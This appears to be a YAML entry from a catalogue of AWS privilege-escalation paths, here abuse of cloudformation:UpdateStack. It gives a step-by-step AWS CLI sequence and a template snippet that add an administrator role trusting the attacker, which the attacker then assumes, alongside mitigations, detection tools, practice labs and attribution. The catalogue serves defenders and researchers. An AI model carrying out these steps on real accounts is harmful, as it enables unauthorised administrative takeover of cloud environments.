id: cloudformation-002
name: cloudformation:UpdateStack
category: access-resource
services:
- cloudformation
- iam
description: A principal with `cloudformation:UpdateStack` can modify an existing CloudFormation stack that has an administrative service role attached. CloudFormation stacks execute with the permissions of their service role, which often requires elevated privileges to manage infrastructure. By updating the stack template to include new IAM resources (such as an admin role with a trust policy allowing the attacker to assume it), the attacker can leverage the stack's elevated permissions to create resources they couldn't create directly. This is particularly insidious because it appears as legitimate infrastructure management activity.
prerequisites:
  admin:
  - A CloudFormation stack must exist with an administrative service role (e.g., AdministratorAccess or an equivalent custom policy)
  - The principal must have permission to update that specific stack
  lateral:
  - A CloudFormation stack must exist with a service role that has elevated permissions
  - The principal must have permission to update that specific stack
exploitationSteps:
  awscli:
  - step: 1
    command: |
      aws cloudformation describe-stacks \
        --stack-name TARGET_STACK_NAME \
        --query 'Stacks[0].[StackName,StackStatus,RoleARN]'
    description: Identify CloudFormation stacks with elevated service roles
  - step: 2
    command: |
      aws cloudformation get-template \
        --stack-name TARGET_STACK_NAME \
        --query 'TemplateBody'
    description: Retrieve the current stack template
  - step: 3
    command: |
      # Create modified template with added IAM role
      # Add resource like:
      # EscalatedAdminRole:
      #   Type: AWS::IAM::Role
      #   Properties:
      #     RoleName: escalated-admin-role
      #     AssumeRolePolicyDocument:
      #       Statement:
      #         - Effect: Allow
      #           Principal:
      #             AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER
      #           Action: sts:AssumeRole
      #     ManagedPolicyArns:
      #       - arn:aws:iam::aws:policy/AdministratorAccess
    description: Modify the template to add an IAM role with admin permissions and a trust policy allowing you to assume it
  - step: 4
    command: |
      aws cloudformation update-stack \
        --stack-name TARGET_STACK_NAME \
        --template-body file://modified-template.json \
        --capabilities CAPABILITY_NAMED_IAM
    description: Update the CloudFormation stack with the modified template (stack's service role creates the new admin role)
  - step: 5
    command: |
      aws cloudformation wait stack-update-complete \
        --stack-name TARGET_STACK_NAME
    description: Wait for the stack update to complete
  - step: 6
    command: |
      aws sts assume-role \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
        --role-session-name escalation-session
    description: Assume the newly created admin role
  - step: 7
    command: |
      # Configure AWS CLI with the temporary credentials from step 6
      # Now you have administrator access
      aws iam list-users
    description: Verify administrator access
recommendation: |
  Restrict the `cloudformation:UpdateStack` permission using the principle of least privilege.

  Use IAM policy conditions to restrict which stacks can be updated:

  ```json
  {
    "Effect": "Allow",
    "Action": "cloudformation:UpdateStack",
    "Resource": "arn:aws:cloudformation:*:*:stack/approved-stack-name/*",
    "Condition": {
      "StringEquals": {
        "cloudformation:StackId": "arn:aws:cloudformation:*:*:stack/approved-stack/*"
      }
    }
  }
  ```

  Additional controls:
  - Implement least privilege principles for CloudFormation service roles - avoid granting AdministratorAccess when more granular permissions suffice
  - Use CloudFormation stack policies to prevent modifications to sensitive resources:
    ```json
    {
      "Statement": [
        {
          "Effect": "Deny",
          "Principal": "*",
          "Action": "Update:*",
          "Resource": "LogicalResourceId/SensitiveRole"
        }
      ]
    }
    ```
  - Implement Service Control Policies (SCPs) to restrict CloudFormation stack updates that create or modify IAM resources
  - Monitor CloudTrail for `UpdateStack` API calls, especially those that modify stacks with elevated service roles
  - Enable CloudFormation drift detection and alerts to identify unauthorized stack modifications
  - Require MFA for CloudFormation updates using condition keys like `aws:MultiFactorAuthPresent`
  - Use IAM Access Analyzer to identify and remediate privilege escalation paths involving CloudFormation permissions
  - Implement change approval workflows for CloudFormation stack updates that modify IAM resources
  - Regularly audit CloudFormation service roles and reduce permissions to the minimum required for stack operations
limitations: |
  This privilege escalation path requires:
  - An existing CloudFormation stack with an elevated service role
  - Permission to update that specific stack (resource-level permissions may restrict which stacks can be updated)
  - The stack's service role must have IAM permissions to create roles and attach policies
  - Stack policies may prevent modifications to certain resources
  - Organizations may have SCPs that restrict CloudFormation IAM operations
discoveredBy:
  name: Erik Steringer
  organization: NCC Group
  date: "2019"
discoveryAttribution:
  firstDocumented:
    author: Erik Steringer
    organization: NCC Group
    date: 2019
    link: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L85-L113
  derivativeOf:
    pathId: cloudformation-001
    modification: "Uses cloudformation:UpdateStack instead of cloudformation:CreateStack to modify an existing stack with an administrative service role"
  ultimateOrigin:
    pathId: cloudformation-001
    author: Spencer Gietzen
    organization: Rhino Security Labs
    date: 2018
    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
references:
- title: PMapper CloudFormation Edge Detection (Original Implementation)
  url: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py
- title: AWS IAM Privilege Escalation - Methods and Mitigation (Rhino Security Labs)
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: Escalating AWS IAM Privileges with an Undocumented CodeStar API
  url: https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/
- title: CloudFormation Change Set Privilege Escalation
  url: https://dev.to/aws-builders/cloudformation-change-set-privilege-escalation-18i6
- title: AWS IAM Privilege Escalation Techniques (HackingThe.Cloud)
  url: https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
- title: AWS CloudFormation Service Role Documentation
  url: https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html
- title: CloudFormation Stack Policies
  url: https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/protect-stack-resources.html
- title: Service Roles for CloudFormation (AWS Prescriptive Guidance)
  url: https://docs.aws.amazon.com/prescriptive-guidance/latest/least-privilege-cloudformation/service-roles-for-cloudformation.html
relatedPaths:
- cloudformation-001
permissions:
  required:
  - permission: cloudformation:UpdateStack
    resourceConstraints: Must have permission to update the target CloudFormation stack
  additional:
  - permission: cloudformation:DescribeStacks
    resourceConstraints: Helpful for identifying stacks with elevated service roles
  - permission: cloudformation:GetTemplate
    resourceConstraints: Useful for retrieving the current stack template to modify
  - permission: iam:GetRole
    resourceConstraints: Helpful for verifying the escalated role was created
  - permission: sts:AssumeRole
    resourceConstraints: Required to assume the newly created admin role
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/cloudformation-updatestack"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: "CloudFormation-UpdateStack"
    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths (requires CloudFormation non-free module, ~$0.40/month)"
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L106-L138
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The starting principal (user or role) with `cloudformation:UpdateStack` permission on the target stack. This principal can modify the stack template to add new AWS resources that will be created with the stack's service role permissions.

  - id: existing_stack
    label: Existing CloudFormation Stack
    type: resource
    description: |
      An existing CloudFormation stack with an administrative service role attached. The stack's service role typically has elevated permissions (e.g., AdministratorAccess) to manage infrastructure resources. The attacker has permission to update this specific stack through `cloudformation:UpdateStack`.

  - id: stack_role
    label: Stack's Administrative Service Role
    type: principal
    description: |
      The IAM role attached to the CloudFormation stack as its service role. This role trusts cloudformation.amazonaws.com and has administrative permissions required to manage infrastructure. When the stack is updated, CloudFormation uses this role's permissions to create, modify, or delete resources defined in the template.

  - id: update_template
    label: Update Stack Template
    type: payload
    color: '#99ccff'
    description: |
      The attacker modifies the stack template to add a new IAM role resource with administrative permissions and a trust policy allowing the attacker to assume it. The modified template is then applied to the stack using `cloudformation:UpdateStack`.

      The new IAM role typically includes:
      - `AssumeRolePolicyDocument` with trust policy allowing the attacker's principal to assume it
      - `ManagedPolicyArns` including arn:aws:iam::aws:policy/AdministratorAccess
      - Or inline policies granting administrative permissions

      This appears as legitimate infrastructure management activity, making it harder to detect than direct IAM modifications.

  - id: new_admin_role
    label: Newly Created Admin Role
    type: principal
    description: |
      The new IAM role created by the CloudFormation stack update. This role has administrative permissions (AdministratorAccess or equivalent) and a trust policy that allows the starting principal to assume it. The role is created using the stack's administrative service role permissions, bypassing the starting principal's limited IAM permissions.

  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      The attacker successfully assumes the newly created admin role and gains full administrative access to the AWS account. The privilege escalation is complete.

  edges:
  - from: start
    to: existing_stack
    label: cloudformation:UpdateStack
    description: |
      The attacker identifies a CloudFormation stack with an administrative service role and uses `cloudformation:UpdateStack` to modify the stack template. This requires permission to update the specific stack.

      First, identify target stacks with elevated service roles:
      ```bash
      aws cloudformation describe-stacks \
        --stack-name TARGET_STACK_NAME \
        --query 'Stacks[0].[StackName,StackStatus,RoleARN]'
      ```

      Then retrieve the current template:
      ```bash
      aws cloudformation get-template \
        --stack-name TARGET_STACK_NAME \
        --query 'TemplateBody'
      ```

  - from: existing_stack
    to: stack_role
    label: Stack uses service role
    description: |
      The CloudFormation stack is configured to use an administrative IAM role as its service role. All resource creation, modification, and deletion operations performed by the stack execute with this role's permissions. This is the key to the privilege escalation - the attacker leverages the stack's elevated permissions to create resources they couldn't create directly.

  - from: stack_role
    to: update_template
    label: Modify template
    description: |
      The attacker creates a modified version of the stack template that adds a new IAM role resource with administrative permissions. The new role includes a trust policy allowing the attacker's principal to assume it.

      Example IAM role resource to add to template:
      ```yaml
      EscalatedAdminRole:
        Type: AWS::IAM::Role
        Properties:
          RoleName: escalated-admin-role
          AssumeRolePolicyDocument:
            Statement:
              - Effect: Allow
                Principal:
                  AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER
                Action: sts:AssumeRole
          ManagedPolicyArns:
            - arn:aws:iam::aws:policy/AdministratorAccess
      ```

  - from: update_template
    to: new_admin_role
    label: Stack creates new admin role
    description: |
      Update the stack with the modified template. The stack's administrative service role executes the template and creates the new IAM role with admin permissions.

      Command:
      ```bash
      aws cloudformation update-stack \
        --stack-name TARGET_STACK_NAME \
        --template-body file://modified-template.json \
        --capabilities CAPABILITY_NAMED_IAM
      ```

      Wait for the update to complete:
      ```bash
      aws cloudformation wait stack-update-complete \
        --stack-name TARGET_STACK_NAME
      ```

      The `--capabilities CAPABILITY_NAMED_IAM` flag is required when the template creates IAM resources with custom names.

  - from: new_admin_role
    to: admin_outcome
    label: sts:AssumeRole
    description: |
      The attacker assumes the newly created admin role using `sts:AssumeRole`. The role's trust policy explicitly allows the attacker's principal to assume it, and the role has administrative permissions.

      Command:
      ```bash
      aws sts assume-role \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
        --role-session-name escalation-session
      ```

      Configure the AWS CLI with the temporary credentials from the assume-role response, then verify administrative access:
      ```bash
      aws iam list-users
      ```

      The attacker now has full administrative access to the AWS account.
